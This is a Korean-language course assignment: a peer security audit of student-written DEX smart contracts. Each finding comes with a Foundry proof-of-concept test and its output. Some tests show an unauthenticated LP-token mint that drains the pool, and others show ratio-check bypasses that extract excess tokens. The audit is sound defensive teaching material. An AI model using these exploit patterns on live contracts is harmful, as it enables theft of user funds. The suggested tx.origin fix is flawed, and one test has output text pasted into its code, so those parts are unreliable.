# Assignment08

# DEX

## 공통 문제

## 1. Error on calculating initial LP token volume

### 설명

문제 코드: Dex.sol addLiquidity 내 sqrt()

sqrt 사용으로 인한 오차가 발생하고, 이로 인해 공급한 토큰과 LP토큰으로 회수할 수 있는 토큰의 양에 오차가 생긴다.

### 파급력

Informational

- 산정 이유
    - 오차의 크기가 매우 작기 때문에 실질적인 문제는 거의 없다.

### 해결방안

- LP토큰의 첫 발행시에만 발생하는 문제로, 첫 발행시에 토큰의 양을 적게 하면 오차를 줄일 수 있다.
- Solidity 자체의 문제로, 완전한 해결이 불가능하다.

## 구민재

## 1. Initial liquidity under 1000 wei gets rounded

### 설명

문제 코드: Dex.sol line8, 31

```jsx
uint public constant MINIMUM_LIQUIDITY = 10**3;
...
function addLiquidity ... {
	...
  if (_totalSupply == 0) {
    LPTokenAmount = _sqrt((tokenXAmount + reserveX) * (tokenYAmount + reserveY) / MINIMUM_LIQUIDITY);
	...
        }
```

MINIMUM_LIQUIDITY라는 고정값 변수를 사용해 초기 LP토큰 발행량을 결정했다.

첫 LP토큰 발행시 1000 미만의 값은 버려지게 된다.

### 파급력

Low

- 산정 이유
    - DEX 서비스 자체의 효용성이 떨어지는 버그이기 때문에 Low를 부여했다.
- 공격 시나리오
    - 첫 유동성 공급자가 공급한 두 토큰의 곱이 1000000으로 나누어떨어지지 않는 경우 무조건 문제가 발생한다. 이 경우 LP토큰 발행량의 1000 wei 아래의 값은 모두 버려진다.
    - 다만 이러한 문제가 발생했을 경우 DEX 유동성 공급자들이 유동성을 회수할 때 공급한 양보다 약간 더 적은 양을 받게 된다.
    - DEX 서비스 자체에 문제가 생기기 때문에 Low를 부여했다.
        
        ```jsx
        function testAddLiquidity1() external {
          uint firstLPReturn = dex.addLiquidity(500 ether, 1 ether, 0);
          emit log_named_uint("firstLPReturn", firstLPReturn);
        
          uint secondLPReturn = dex.addLiquidity(1 ether, 0.002 ether, 0);
          emit log_named_uint("secondLPReturn", secondLPReturn);
        
          (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
          emit log_named_uint("second LP remove", tx);
          emit log_named_uint("second LP remove", ty);
        
          assertEq(tx, 1 ether);
          assertEq(ty, 0.002 ether);
        }
        
        ```
        
        ```jsx
        [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 258781)
        Logs:
          firstLPReturn: 707106781186547524
          secondLPReturn: 1414213562373095
          second LP remove: 999999999999999966
          second LP remove: 1999999999999999
          Error: a == b not satisfied [uint]
                Left: 999999999999999966
               Right: 1000000000000000000
          Error: a == b not satisfied [uint]
                Left: 1999999999999999
               Right: 2000000000000000
        ```
        

- 난이도
    - 외부 공격자보다는 첫 유동성을 공급하는 DEX service provider로 인해 발생할 가능성이 높다.

- 발생할 수 있는 피해
    - 유동성 공급자들이 제 공급량을 찾아가지 못하므로 DEX의 사용성이 매우 떨어진다.

### 해결 방안

- 문제가 되는 코드에서 MINIMUM_LIQUIDITY 변수를 삭제하면 해결 가능하다.

## 2. No authority check for LP mint

### 설명

문제 코드: Dex.sol line106

transfer() 함수가 LP토큰을 mint해주는 중요한 역할을 하는 함수임에도 불구하고 권한 체크를 해주지 않았다. 따라서 누구나 접근 가능하며, 원하는 만큼의 LP토큰을 발행하고 그만큼 유동성 풀에 공급된 토큰을 탈취할 수 있다.

```java
function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) {
  require(msg.origin == address(this), "you are not authorized");
  _mint(to, lpAmount);
  return true;
}
```

### 파급력

Critical

- 산정 이유
    - 누구든 접근할 수 있으며, 피해 규모 또한 크기 때문에 Critical을 부여했다.
- 공격 시나리오
    - tester1이 유동성 공급을 전혀 하지 않은 상태에서 transfer() 함수를 통해 LP토큰을 자신에게 민팅하였고, 그 토큰을 이용해 유동성 풀에 공급된 전체 토큰을 탈취하였다.
    
    ```jsx
    function testTransfer() external {
      uint firstLPReturn = dex.addLiquidity(10000 ether, 10000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      address tester1 = vm.addr(1);
      uint tester1_balanceX_before = tokenX.balanceOf(tester1);
      uint tester1_balanceY_before = tokenY.balanceOf(tester1);
      emit log_named_uint("tester1's token X balance", tester1_balanceX_before);
      emit log_named_uint("tester1's token Y balance", tester1_balanceY_before);
      vm.startPrank(tester1);
          // vm.expectRevert("you are not authorized for LP mint.");
          dex.transfer(tester1, 10000 ether);
          dex.removeLiquidity(10000 ether, 1 ether, 1 ether);
          uint tester1_balanceX = tokenX.balanceOf(tester1);
          uint tester1_balanceY = tokenY.balanceOf(tester1);
          emit log_named_uint("tester1's token X balance", tester1_balanceX);
          emit log_named_uint("tester1's token Y balance", tester1_balanceY);
      vm.stopPrank();
    }
    ```
    
    ```jsx
    [PASS] testTransfer() (gas: 285355)
    Logs:
      firstLPReturn: 10000000000000000000
      tester1's token X balance: 0
      tester1's token Y balance: 0
      tester1's token X balance: 9990009990009990009990
      tester1's token Y balance: 9990009990009990009990
    ```
    

- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - 유동성 공급 여부와 상관없이 누구나 유동성 토큰을 발행할 수 있으며, 발행한 토큰의 양만큼 회수가 가능하다. 따라서 DEX에 공급된 자산 전부를 탈취할 수 있다.

### 해결 방안

- transfer 함수의 접근 권한을 address(this)로 제한하면 해결된다.
    
    ```jsx
    function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) {
      require(tx.origin == address(this), "you are not authorized");
      _mint(to, lpAmount);
      return true;
    }
    ```
    

## 권준우

## 1. No Imbalance Check on Add Liquidity(2)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.

### 파급력

Critical

- 산정 이유
    - Imbalance하게 유동성을 공급한 모두가 손해를 보며, 기존 유동성 공급자들은 그만큼의 이익을 나눠갖는다.
    - Frontend에서 서비스 공급자가 실제 유동성 풀의 비율과 다르게 보여준 뒤, 유동성 공급자가 손해를 보도록 유도할 수 있다.
- 공격 시나리오
    - Imbalance한 유동성 공급이 가능하다.
    - 하지만 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 더 적은 토큰을 기준으로 LP토큰이 발행된다.
    
    ```jsx
    function testAddLiquidity2() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 1000 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 1000 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity2() (gas: 276974)
    Logs:
      firstLPReturn: 1000000000000000000000
      secondLPReturn: 1000000000000000000
      second LP remove: 1000000000000000000
      second LP remove: 1998001998001998001
      Error: a == b not satisfied [uint]
        Expected: 1000000000000000000000
          Actual: 1998001998001998001
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - imbalance하게 유동성 공급을 시도한 사람은 공급한 유동성의 상당량을 회수할 수 없게 된다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

## 2. No LP Token Minted

### 설명

문제 코드: Dex.sol addLiquidity 함수

유동성 공급 및 회수에 실제 LP 토큰이 사용되는 것이 아닌 내부 전역변수의 state로 관리된다.

### 파급력

Informational

- 산정 이유
    - 외부 공격이 아닌 컨트랙트 자체의 문제점이다.
    - 유동성 공급을 하더라도 사용자에게 돌아오는 이득이 전혀 없다.
    - 사용자에게 실질적인 이득이 없으니 DEX의 효용성이 떨어지는 문제이다.

### 해결 방법

- addLiquidity에서 LPToken_balances 등의 배열로 토큰의 수량을 저장하기보다는 mint, burn 등의 함수를 통해 실제로 토큰이 발급되고 회수되는 로직을 구현해야 한다.

## 김남령

## 1. Remove Liquidity Does Not Work on Proper Request

### 설명

문제 코드: removeLiquidity 함수, 151번 줄

```jsx
function removeLiquidity ... {
	require(amountX >_minimumTokenXAmount && amountY>_minimumTokenYAmount, "INSUFFICIENT_LIQUIDITY_BURNED");
}
```

miniminTokenAmount를 본인이 유동성 공급한 토큰만큼으로 설정할 시 에러를 발생시킨다.

### 파급력

Informational

- 산정 이유
    - 컨트랙트의 효용성이 떨어지는 문제만 발생하기 때문에 Informational로 산정했다.

### 해결방안

- 조건문에 등호를 추가한다.

```jsx
function removeLiquidity ... {
	require(amountX >= _minimumTokenXAmount && amountY >= _minimumTokenYAmount, "INSUFFICIENT_LIQUIDITY_BURNED");
}
```

## 김영운

## 1. No Imbalance Check on Add Liquidity(2)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.

### 파급력

Critical

- 산정 이유
    - Imbalance하게 유동성을 공급한 모두가 손해를 보며, 기존 유동성 공급자들은 그만큼의 이익을 나눠갖는다.
    - Frontend에서 서비스 공급자가 실제 유동성 풀의 비율과 다르게 보여준 뒤, 유동성 공급자가 손해를 보도록 유도할 수 있다.
- 공격 시나리오
    - Imbalance한 유동성 공급이 가능하다.
    - 하지만 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 더 적은 토큰을 기준으로 LP토큰이 발행된다.
    
    ```jsx
    function testAddLiquidity2() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 1000 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 1000 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity2() (gas: 276974)
    Logs:
      firstLPReturn: 1000000000000000000000
      secondLPReturn: 1000000000000000000
      second LP remove: 1000000000000000000
      second LP remove: 1998001998001998001
      Error: a == b not satisfied [uint]
        Expected: 1000000000000000000000
          Actual: 1998001998001998001
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - imbalance하게 유동성 공급을 시도한 사람은 공급한 유동성의 상당량을 회수할 수 없게 된다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

## 김지우

## 1. No Imbalance Check on Add Liquidity(2)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.

### 파급력

Critical

- 산정 이유
    - Imbalance하게 유동성을 공급한 모두가 손해를 보며, 기존 유동성 공급자들은 그만큼의 이익을 나눠갖는다.
    - Frontend에서 서비스 공급자가 실제 유동성 풀의 비율과 다르게 보여준 뒤, 유동성 공급자가 손해를 보도록 유도할 수 있다.
- 공격 시나리오
    - Imbalance한 유동성 공급이 가능하다.
    - 하지만 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 더 적은 토큰을 기준으로 LP토큰이 발행된다.
    
    ```jsx
    function testAddLiquidity2() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 1000 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 1000 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity2() (gas: 274175)
    Logs:
      firstLPReturn: 1000000000000000000000
      secondLPReturn: 1000000000000000000
      second LP remove: 1000000000000000000
      second LP remove: 1998001998001998001
      Error: a == b not satisfied [uint]
            Left: 1998001998001998001
           Right: 1000000000000000000000
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - imbalance하게 유동성 공급을 시도한 사람은 공급한 유동성의 상당량을 회수할 수 없게 된다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

## 김한기

## 1. RemoveLiquidity Does Nothing

### 설명

문제 코드: removeLiquidity 함수 전체

removeLiquidity에 LPToken만큼의 tokenX와 tokenY를 되돌려주는 로직이 구현되어있지 않다.

removeLiquidity는 돌려받아야할 tokenX와 tokenY의 값만 반환한다.

### 파급력

Critical

- 산정 이유
    - 유동성을 공급한 모든 사람에게 해당하는 문제이다.
    - 유동성을 공급한 모든 사람은 LP토큰만 받고 자신의 자산을 되돌려받을 수 없다.
- 공격 시나리오
    - 유동성을 공급하고 제거하는 일반적인 경우이다.
    - removeLiquidity의 반환값은 정상적으로 출력되나 실제 LP토큰과 X,Y토큰 모두의 balance에 반영되지 않는다.
    
    ```jsx
    function testAddLiquidity() external {
      uint firstLPReturn = dex.addLiquidity(5000 ether, 20 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      address tester = address(0x1);
      tokenX.transfer(tester, 1000 ether);
      tokenY.transfer(tester, 4 ether);
      vm.startPrank(tester);
          tokenX.approve(address(dex), 10000 ether);
          tokenY.approve(address(dex), 10000 ether);
          uint secondLPReturn = dex.addLiquidity(1000 ether, 4 ether, 0);
          emit log_named_uint("secondLPReturn", secondLPReturn);
    
          (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
          emit log_named_uint("second LP remove", tx);
          emit log_named_uint("second LP remove", ty);
          uint tester_balanceX = tokenX.balanceOf(tester);
          uint tester_balanceY = tokenY.balanceOf(tester);
          emit log_named_uint("tester X balance", tester_balanceX);
          emit log_named_uint("tester Y balance", tester_balanceY);
          assertEq(tx, 1000 ether);
          assertEq(ty, 4 ether);
      vm.stopPrank();
    }
    ```
    
    ```jsx
    [PASS] testAddLiquidity() (gas: 306071)
    Logs:
      firstLPReturn: 100000000000000000000000
      secondLPReturn: 20000000000000000000000
      second LP remove: 1000000000000000000000
      second LP remove: 4000000000000000000
      tester X balance: 0
      tester Y balance: 0
    ```
    
- 공격 난이도
    - DEX 설계자로 인해 발생한 문제로, 참여하는 모두가 영향을 받는다.

### 해결책

removeLiquidity 함수가 LPToken의 burn과 토큰 X,Y에 대한 transfer를 수행할 수 있도록 고쳐야 한다.

## 2. No authority check for LP mint

### 설명

문제 코드: LPT 컨트랙트 전체, transfer 함수 전체

DEX 컨트랙트와는 다른 컨트랙트를 통해 LP토큰을 민팅하였으나, 이를 transfer하는 과정에서 검증이 이루어지지 못해 누구나 LP토큰을 민팅할 수 있는 문제점이 발생했다.

### 파급력

Critical

- 산정 이유
    - 1번 문제로 인해 LP토큰의 효용성이 현재는 아예 없지만, removeLiquidity가 고쳐진 상태에서는 유동성 풀의 전체 토큰을 탈취할 수 있는 심각한 문제점이다.
    - 공격자는 별다른 조건 없이 transfer를 호출해 무한정으로 LP토큰을 발급받을 수 있다.
- 공격 시나리오
    
    ```jsx
    contract LPT ... {
    	constructor() {
          _admin = msg.sender;
      }
    
      modifier onlyAdmin {
          require(_admin == msg.sender, "only Admin");
          _;
      }
    
      function mint(address account, uint256 amount) onlyAdmin external {
          _mint(account, amount);
      }
    }
    
    function transfer(address to, uint256 lpAmount) external returns (bool) {
      require(lpAmount > 0);
    
      lpt.mint(payable(address(this)), lpAmount);
      lpt.transfer(payable(to), lpAmount);
    
      return true;
    }
    ```
    
    - transfer를 호출하면 DEX 컨트랙트가 LPToken을 민팅하고, 이를 임의로 지정한 주소로 보낼 수 있다.
    - DEX가 LPT를 선언하기 때문에 LPT의 admin은 DEX이다.
    - 따라서 transfer가 누구에 의해서 호출되건 lpt는 mint를 실행해서 to 주소로 LPToken을 보낸다.
- 공격 난이도
    - transfer 함수를 호출할 수 있는 사람은 모두 공격자가 될 수 있다.

### 해결 방안

- transfer 함수에 자체에 대해 관리자만 내용을 실행할 수 있도록 권한을 설정해주어야 한다.

## 3. Error on Setting Price of Tokens

### 설명

문제 코드: addLiquidity 함수 전체

```jsx
function addLiquidity ... {
	
	...
	
	if (lptTotalSupply < 1) {
    priceOfX = oracle.setPrice(_tokenX, tokenXAmount / decimals);
    priceOfY = oracle.setPrice(_tokenY, tokenYAmount / decimals);
	} else {
    priceOfX = oracle.getPrice(_tokenX);
    priceOfY = oracle.getPrice(_tokenY);
	}
  
	...
	
	if (lptTotalSupply > 0){...}
	else{
  LPTokenAmount = Math.sqrt((priceOfX * (balanceOfX + tokenXAmount)) * (priceOfY * (balanceOfY + tokenYAmount)), Math.Rounding.Up);
  }
	
	...

	address(this).call(abi.encodeWithSelector(this.transfer.selector, msg.sender, LPTokenAmount));
	
	...
}
```

oracle을 통해 토큰의 가격을 설정하는 과정에서 오류가 발생한다.

유동성 공급 시 1 ether 미만의 양을 공급할 시 유동성 풀에는 토큰이 들어간다.

하지만 setPrice를 각각 0으로 설정하는 동시에 LPTokenAmount로 0을 반환한다.

따라서 1 ether 이상의 유동성이 공급될 때까지 lptTotalSupply = 0으로 설정된 채로 addLiquidity 함수가 실행된다.

### 파급력

Informational

- 산정 이유
    - 첫 유동성 공급자, 즉 service provider가 유의하면 문제는 발생하지 않는다. 유동성 공급 과정에서 1 ether 이상을 보낸 일이 없어야 한다.
    - 문제가 발생할 가능성이 거의 없다.
- 공격 시나리오
    
    ```jsx
    function testSetPrice() external {
      DreamOracle dreamOracle;
      for (uint i = 0; i < 100; i++) {
          uint firstLPReturn = dex.addLiquidity(0.9 ether, 0.9 ether, 0);
      }
      emit log_named_uint("X balance", tokenX.balanceOf(address(dex)));
      emit log_named_uint("Y balance", tokenY.balanceOf(address(dex)));
    
      // uint LPReturn = dex.addLiquidity(1 ether, 1 ether, 0);
    
      uint LPReturn = dex.addLiquidity(1 ether, 1 ether, 0);
    
      (uint tx, uint ty) = dex.removeLiquidity(LPReturn, 0, 0);
      emit log_named_uint("Attacker LP remove", tx);
      emit log_named_uint("Attacker LP remove", ty);
      assertEq(tx, 1 ether);
      assertEq(ty, 1 ether); 
      vm.stopPrank();
    
      uint LPReturn2 = dex.addLiquidity(0.9 ether, 0.9 ether, 0);
    
      (uint tx2, uint ty2) = dex.removeLiquidity(LPReturn2, 0, 0);
      emit log_named_uint("Attacker LP2 remove", tx2);
      emit log_named_uint("Attacker LP2 remove", ty2);
      assertEq(tx2, 0.9 ether);
      assertEq(ty2, 0.9[FAIL. Reason: Assertion failed.] testSetPrice() (gas: 1961494)
      vm.stopPrank();
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testSetPrice() (gas: 1961494)
    Logs:
      X balance: 90000000000000000000
      Y balance: 90000000000000000000
      Attacker LP remove: 91000000000000000000
      Attacker LP remove: 91000000000000000000
      Error: a == b not satisfied [uint]
            Left: 91000000000000000000
           Right: 1000000000000000000
      Error: a == b not satisfied [uint]
            Left: 91000000000000000000
           Right: 1000000000000000000
      Attacker LP2 remove: 1000000000000000000
      Attacker LP2 remove: 1000000000000000000
    ```
    
    - TokenX와 TokenY를 각각 0.9 ether씩 100번 공급하고, 이후 1 ether씩을 공급해준다.
    - 지금까지 공급된 양이 전부 첫 유동성 공급으로 반영된다.
    - 이후 공급된 유동성에 대해서는 문제 없이 반영된다.
    

### 해결방안

- setPrice에서 decimal로 나누지 않아야 한다.
- 나눗셈 등 decimal이 직접적으로 사용되지 않아도 되는 부분에서의 사용을 지양해야 한다.

## 서준원

## 1. No Imbalance Check on Add Liquidity(1)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다. 또한 LP토큰 발행량 계산시 tokenX의 양만을 고려해 발행하기 때문에, Y의 양을 아무리 적게 넣더라도 X의 양에 비례한 LPToken을 발행받는다.

```jsx
function addLiquidity ... {
	...
	if(totalSupply() == 0){ LPTokenAmount = tokenXAmount * tokenYAmount / 10**18;} else{ LPTokenAmount = totalSupply() * tokenXAmount / reserveX;}

	require(minimumLPTokenAmount <= LPTokenAmount)
	...
}
```

### 파급력

Critical

- 산정 이유
    - 접근성이 매우 높고 피해 규모 또한 크다.
- 공격 시나리오
    - 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 공급하지 않은 Y토큰까지 탈취가 가능하다.
    - 아래 코드에서 TokenY는 1 ether만 공급하지만 LP토큰으로 회수하는 양은 500.5 ether이다.
    
    ```jsx
    function testAddLiquidity() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1000 ether, 1 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1000 ether);
      assertEq(ty, 1 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 230416)
    Logs:
      firstLPReturn: 1000000000000000000000000
      secondLPReturn: 1000000000000000000000000
      second LP remove: 1000000000000000000000
      second LP remove: 500500000000000000000
      Error: a == b not satisfied [uint]
            Left: 500500000000000000000
           Right: 1000000000000000000
    ```
    
- 공격 난이도
    - 누구나 접근 가능하므로, 매우 쉽다.
- 발생할 수 있는 피해
    - 유동성 공급 여부와 상관없이 누구나 유동성 토큰을 발행할 수 있으며, 발행한 토큰의 양만큼 회수가 가능하다. 따라서 DEX에 공급된 자산 전부를 탈취할 수 있다.

### 해결 방안

- addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

```jsx
require(reserveX * tokenYAmount == reserveY * tokenXAmount);
```

## 서지혜

## 1. Initial Liquidity Under 1 ether Gets Rounded Down

### 설명

문제 코드: Dex.sol addLiquidity 함수, 67번째 줄

```java
function addLiquidity ... {
	...
	if(totalSupply() == 0){
    lpAmount = tokenXAmount * tokenYAmount / _decimal;
  }
	...
}
```

첫 LP 토큰의 발행 시 두 토큰의 양의 곱을 decimal(10의 18승)으로 나누는데, 이 과정에서 decimal 이하의 값이 버려지는 현상이 발생한다.

### 파급력

Low

- 산정 이유
    - 첫 유동성 공급자만 손해를 본다.
- 공격 시나리오
    
    ```java
    function testAddLiquidity3() external {
      uint firstLPReturn = dex.addLiquidity(10**9, 10**8, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1 ether, 0.1 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 1 ether);
      assertEq(ty, 0.1 ether);
    }
    ```
    
    ```java
    [FAIL. Reason: Assertion failed.] testAddLiquidity3() (gas: 192172)
    Logs:
      firstLPReturn: 0
      secondLPReturn: 100000000000000000
      second LP remove: 1000000001000000000
      second LP remove: 100000000100000000
      Error: a == b not satisfied [uint]
            Left: 1000000001000000000
           Right: 1000000000000000000
      Error: a == b not satisfied [uint]
            Left: 100000000100000000
           Right: 100000000000000000
    ```
    
    - 첫 유동성 공급 시 두 토큰의 곱이 1 ether 아래이기 때문에 모두 버려져 0이 되는 것을 볼 수 있다.
- 공격 난이도
    - 공격자를 요하지 않는 내부 로직 문제이다.

### 해결 방안

- 해당 로직은 두 토큰의 양을 곱하면서 단위 (ether)가 제곱되는 현상을 해소하고자 만들어진 것으로 보인다. 직접적인 나눗셈으로 인한 버림을 피하기 위해 초기 토큰 발행 시 제곱근을 적용하는 등의 방식이 적용될 수 있다.

## 2. LPTokenAmount Dependent to Token X

### 설명

문제 코드: Dex.sol addLiquidity 함수, 71번째 줄

```java
function addLiquidity ... {
	...
	else{
  require(_decimal * tokenXAmount / tokenYAmount == _decimal * _amountX / _amountY, "amount breaks the pool ratio");
  lpAmount = totalSupply() * tokenXAmount / _amountX;
  }
	...
}
```

require 구문에서 tokenX와 Y의 교환비가 극단적으로 차이나는 경우 (1 : 1 ether 이상) rounding이 발생해 검사를 우회할 수 있고, 유동성 풀의 balance를 깨는 공급이 가능해진다. 또한 이러한 조건을 거친 뒤 발행하는 LPToken의 양이 X의 공급량에 의존한다. 따라서 X를 많이 공급하고 Y를 정상적인 비율보다 적게 공급하더라도 발급받은 LPToken으로 X의 양에 비례하는 Y를 회수할 수 있다.

### 파급력

Medium

- 산정 이유
    - 실질적인 공격이 발생할 가능성이 매우 적지만, 발생시 유동성 풀에 매우 큰 영향을 미칠 수 있다.
- 공격 시나리오
    
    ```java
    function testAddLiquidity3() external {
      uint firstLPReturn = dex.addLiquidity(1, 10 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(20, 50 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      assertEq(tx, 20);
      assertEq(ty, 50 ether);
    }
    ```
    
    ```java
    [FAIL. Reason: Assertion failed.] testAddLiquidity3() (gas: 239052)
    Logs:
      firstLPReturn: 10
      secondLPReturn: 200
      second LP remove: 20
      second LP remove: 57142857142857142857
      Error: a == b not satisfied [uint]
            Left: 57142857142857142857
           Right: 50000000000000000000
    ```
    
    - require 구문에서 좌항과 우항 모두 0의 값을 가지므로 balance가 맞지 않은 값이 통과할 수 있다. 또한 초기에 설정해놓은 1 : 10 ether의 값을 깨고 20 : 50 ether로 유동성을 공급할 수 있으며, 이를 이용해 발급한 LP토큰을 회수할 시 공급한 양보다 더 많은 양을 회수할 수 있다.
- 공격 난이도
    - 공격자가 첫 유동성 공급자가 공급한 수량을 어느정도 알고 있어야 공격에 성공할 수 있다는 점에서 현실적으로 어려움이 크다.

### 해결방안

require 구문 검사 시 나눗셈을 지양하고 decimal과의 곱 또한 제거하는 것이 좋다.

```java
require(tokenXAmount * _amountY == _amountX * tokenYAmount, "amount breaks the pool ratio");
```

## 이성휘

## 1. Improper Implementation of Liquidity

### 설명

LP토큰을 발행하고 회수하는 공식이 제대로 설계되어 있지 않다.

addLiquidity, removeLiquidity가 LP토큰에 대한 지분을 올바르게 반환하지 않는다.

구현된 로직에 따르면 LP토큰의 발행량이 토큰의 양보다는 유동성 공급 순서에 더 dependent하며, 마지막에 addLiquidity를 수행한 사람이 가장 많은 지분을 가져간다.

### 파급력

Critical

- 산정 이유
    - 유동성을 공급하는 순간 DEX가 제 기능을 하지 못하고 망가진다.
    - 공급자 간의 토큰량이 차이가 많을수록 LP토큰으로 회수할 수 있는 토큰과 실제 공급한 토큰 사이의 오차가 더 커진다.
- 공격 시나리오
    
    ```jsx
    function testAddLiquidity() external {
      uint firstLPReturn = dex.addLiquidity(5000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);
    
      uint secondLPReturn = dex.addLiquidity(1000 ether, 200 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);
    
      uint thirdLPReturn = dex.addLiquidity(10 ether, 2 ether, 0);
      emit log_named_uint("thirdLPReturn", thirdLPReturn);
    
      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);
    
      (uint tx2, uint ty2) = dex.removeLiquidity(thirdLPReturn, 0, 0);
      emit log_named_uint("third LP remove", tx2);
      emit log_named_uint("third LP remove", ty2);
    
      assertEq(tx, 1000 ether);
      assertEq(ty, 200 ether);
      assertEq(tx2, 10 ether);
      assertEq(ty2, 2 ether);
    }
    ```
    
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity() (gas: 648904)
    Logs:
      firstLPReturn: 2236067977499789696409
      secondLPReturn: 11180339887498948482045
      thirdLPReturn: 6708203932499369089227000
      second LP remove: 9996673320026600000
      second LP remove: 1999334664005300000
      third LP remove: 6010000000000000000000
      third LP remove: 1202000000000000000000
      Error: a == b not satisfied [uint]
            Left: 9996673320026600000
           Right: 1000000000000000000000
      Error: a == b not satisfied [uint]
            Left: 1999334664005300000
           Right: 200000000000000000000
      Error: a == b not satisfied [uint]
            Left: 6010000000000000000000
           Right: 10000000000000000000
      Error: a == b not satisfied [uint]
            Left: 1202000000000000000000
           Right: 2000000000000000000
    ```
    
    - 두 공급자 모두 자신이 넣은 것과는 다른 양의 토큰을 회수하였다. 전체 유동성의 20%를 공급한 사람은 공급한 토큰의 1%만 회수하였고, 가장 적은 양을 공급한 사람은 공급량의 6000%를 회수하였다.
- 공격 난이도
    - 유동성 공급자 모두 공격을 수행할 수 있지만, 가장 마지막에 유동성을 공급한 사람이 거의 모든 지분을 가져갈 수 있어 경쟁적일 수 있다.

### 해결 방안

- addLiquidity, removeLiquidity 함수를 로직에 맞게 다시 구현해야한다.

## 2. No LP Token Minted

### 설명

문제 코드: Dex.sol addLiquidity 함수

유동성 공급 및 회수에 실제 LP 토큰이 사용되는 것이 아닌 내부 전역변수의 state로 관리된다.

### 파급력

Informational

- 산정 이유
    - 외부 공격이 아닌 컨트랙트 자체의 문제점이다.
